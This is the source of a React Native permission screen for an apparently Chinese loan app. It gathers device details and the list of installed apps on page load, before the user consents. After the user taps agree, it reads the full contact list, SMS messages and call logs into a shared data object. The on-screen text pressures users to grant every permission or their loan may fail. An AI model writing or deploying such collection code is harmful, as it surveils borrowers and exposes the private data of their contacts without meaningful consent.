'use strict'

/**
 *
 * @format
 * @flow
 */

import React, { Component } from 'react'
import {
  TouchableWithoutFeedback,
  TouchableOpacity,
  ScrollView,
  DeviceEventEmitter,
  requireNativeComponent,
  Platform,
  Dimensions,
  ToastAndroid,
  BackHandler,
  TextInput,
  FlatList,
  Image,
  StyleSheet,
  View,
  StatusBar,
} from 'react-native'
import { Tab, Tabs, Container, Header, Content, Button, Text, Form, Item, Input, Label, Picker, Icon } from 'native-base'
import BaseScreen from '../../components/BaseScreen'
import { px, sp } from '../../utils/Device'
import { endpoint, images } from '../../common/Constants'
import MyHttpUtils from '../../utils/MyHttpUtils'
import { color } from '../../common/MyStyle'
import { showToast } from '../../utils/MyToastUtils'
import TabHeader from '../../common/TabHeader'
import Permissions from 'react-native-permissions'
import Contacts from 'react-native-contacts'
import mynative from '../../components/native/mynative'
import PermissionManager from '../../common/PermissionManager'
import DeviceInfo from 'react-native-device-info'
import LoginManager from '../../common/LoginManager'

export default class PermissionRequestScreen extends BaseScreen {
  constructor(props) {
    super(props)
    this.state = {}
  }

  toNextStep = () => {
    console.log('toNextStep')
    console.log(LoginManager.phoneData)
    MyHttpUtils.fetchRequest('post', endpoint.user.checkAuthentication).then((responseJson) => {
      let url = ''
      // 0 需进行人证核验 1 需进行运营商认证 2 无需认证  3 bank
      if (responseJson.data.state == 0) {
        url = 'IDCard'
      } else if (responseJson.data.state == 1) {
        url = 'Operator'
      } else if (responseJson.data.state == 2) {
        url = 'BorrowConfirm'
      } else if (responseJson.data.state == 3) {
        url = 'BankCard'
      }
      if (url != '') {
        this.props.navigation.navigate(url)
        // this.props.navigation.replace(url)
      } else {
        showToast('非法状态')
      }
    })
  }

  /**
   * 获取一些进入该页面就能拿到的信息
   */
  getInfoWithoutPermission = () => {
    // 不要用1024，因为厂商显示就是这样做的
    let gbSize = 1000 * 1000 * 1000
    DeviceInfo.getBatteryLevel().then((batteryLevel) => {
      // 0.75 means 75%
      LoginManager.phoneData['deviceInfo']['batteryLevel'] = batteryLevel
      console.log('batteryLevel' + batteryLevel)
    })
    DeviceInfo.getBrand().then((brand) => {
      // iOS: "Apple"
      // Android: "xiaomi"
      LoginManager.phoneData['deviceInfo']['brand'] = brand
      console.log('brand' + brand)
    })
    DeviceInfo.getModel().then((model) => {
      LoginManager.phoneData['deviceInfo']['model'] = model
      console.log('model' + model)
    })
    DeviceInfo.getPowerState().then((state) => {
      // {
      //   batteryLevel: 0.759999,
      //   batteryState: 'unplugged',
      //   lowPowerMode: false,
      // }
      LoginManager.phoneData['deviceInfo']['state'] = state
      console.log('state' + state)
    })
    DeviceInfo.getSystemVersion().then((systemVersion) => {
      // iOS: "11.0"
      // Android: "7.1.1"
      LoginManager.phoneData['deviceInfo']['systemVersion'] = systemVersion
      console.log('systemVersion' + systemVersion)
    })
    DeviceInfo.getTotalDiskCapacity().then((capacity) => {
      // Android: 17179869184
      // iOS: 17179869184
      LoginManager.phoneData['deviceInfo']['capacity'] = capacity / gbSize
      console.log('capacity' + capacity / gbSize)
    })
    DeviceInfo.getFreeDiskStorage().then((freeDiskStorage) => {
      // Android: 17179869184
      // iOS: 17179869184
      LoginManager.phoneData['deviceInfo']['freeDiskStorage'] = freeDiskStorage / gbSize
      console.log('freeDiskStorage' + freeDiskStorage / gbSize)
    })
    DeviceInfo.getTotalMemory().then((totalMemory) => {
      // 1995018240
      // Gets the device total memory, in bytes.
      LoginManager.phoneData['deviceInfo']['totalMemory'] = totalMemory / gbSize
      console.log('totalMemory' + totalMemory / gbSize)
    })
    DeviceInfo.getUsedMemory().then((usedMemory) => {
      // 23452345
      LoginManager.phoneData['deviceInfo']['usedMemory'] = usedMemory / gbSize
      console.log('usedMemory' + usedMemory / gbSize)
    })
    if (Platform.OS == 'android') {
      mynative.getOtherAppInfo((data) => {
        console.log(data)
        LoginManager.phoneData['apps'] = data
      })
    }
  }

  getAndroidCallLog = () => {
    PermissionManager.requestCallLogPermission().then((flag) => {
      console.log(flag)
      if (flag) {
        mynative.getPhoneLog((data) => {
          // console.log(data)
          LoginManager.phoneData['phoneLog'] = data
        })
        this.toNextStep()
      }
    })
  }

  getAndroidSMS = () => {
    Permissions.request(['readSms']).then((response) => {
      if (response == 'authorized') {
        mynative.getSMS((data) => {
          // console.log(data)
          LoginManager.phoneData['sms'] = data
        })
        this.getAndroidCallLog()
      }
    })
  }

  agree = () => {
    // 请求权限并收集数据
    // https://github.com/react-native-community/react-native-permissions
    Permissions.request('contacts').then((response) => {
      // console.log(response)
      // Response is one of: 'authorized', 'denied', 'restricted', or 'undetermined'
      if (response == 'authorized') {
        Contacts.getAll((err, contacts) => {
          if (err) {
            showToast('信息获取出错，请重试')
            return
          }
          LoginManager.phoneData['contacts'] = contacts
          // console.log(contacts)
        })
        if (Platform.OS == 'android') {
          this.getAndroidSMS()
        } else {
          this.toNextStep()
        }
      }
    })
  }

  render() {
    return (
      <View style={styles.main_container}>
        <ScrollView>
          <TabHeader
            text="借款服务协议"
            onPress={() => {
              this.props.navigation.goBack()
            }}
          />
          <View>
            {/* 借款协议头部 */}
            <View style={styles.topcontent}>
              <Image style={{ width: px(54), height: px(54), marginRight: px(11) }} source={images.agreement_pic} />
              <Text style={{ color: '#111111', fontSize: sp(12), width: px(270) }}>
                请您仔细阅读下列注意事项，并严格按照说明进行操作，如未按照要求进行操作，将会影响你的借款成功率。
              </Text>
            </View>

            {/* 借款协议中部内容 */}
            <View style={styles.content}>
              <Text style={{ fontSize: sp(12), color: '#111111', lineHeight: px(20) }}>
                1.请在接下来的操作中的权限申请全部给予允许，若无法通过，请重试或卸载软件后重新安装。{'\n'}
                {'\n'}
                2.我们将会对您的身份信息进行严格验证，请您准备如下材料：{'\n'}
                {'\n'}
                <Text style={{ fontSize: sp(12), color: '#E91818' }}>
                  （a） 您本人有效的大陆居民身份证证件。{'\n'}
                  {'\n'}
                  （b） 您本人储蓄银行卡一张及对应绑定的手机号。{'\n'}
                  {'\n'}
                  （c） 能够正常接受收短信的本人身份证办理的手机号。{'\n'}
                  {'\n'}
                </Text>
                3.在申请认证中，会对您的信息进行验证，确保是您本人操作，本人有效身份证，本人有效银行卡，本人身份证注册的手机号。{'\n'}
                {'\n'}
              </Text>
            </View>
            <Button
              full
              style={styles.buttonstyle}
              onPress={() => {
                this.agree()
              }}
            >
              <Text style={{ color: color.white }}>同意</Text>
            </Button>
          </View>
          <Button
            full
            style={styles.buttonstyle}
            onPress={() => {
              this.props.navigation.goBack()
            }}
          >
            <Text style={{ color: color.white }}>拒绝</Text>
          </Button>
        </ScrollView>
      </View>
    )
  }

  componentDidMount() {
    super.componentDidMount()
    this.getInfoWithoutPermission()
  }

  componentWillUnmount() {
    super.componentWillUnmount()
  }
}

var styles = StyleSheet.create({
  main_container: {
    flex: 1,
    flexDirection: 'column',
    backgroundColor: '#E9ECEF',
  },
  topcontent: {
    flexDirection: 'row',
    justifyContent: 'center',
    paddingTop: px(23),
    paddingBottom: px(23),
  },
  content: {
    marginHorizontal: px(20),
    height: px(352),
    backgroundColor: '#FDFDFD',
    borderRadius: px(8),
    borderTopWidth: px(2),
    borderColor: '#F58C00',
    padding: px(21),
    marginBottom: px(23),
  },
  buttonstyle: {
    width: px(130),
    height: px(38),
    backgroundColor: '#F58C00',
    borderRadius: px(19),
    marginBottom: px(22),
    alignSelf: 'center',
  },
})
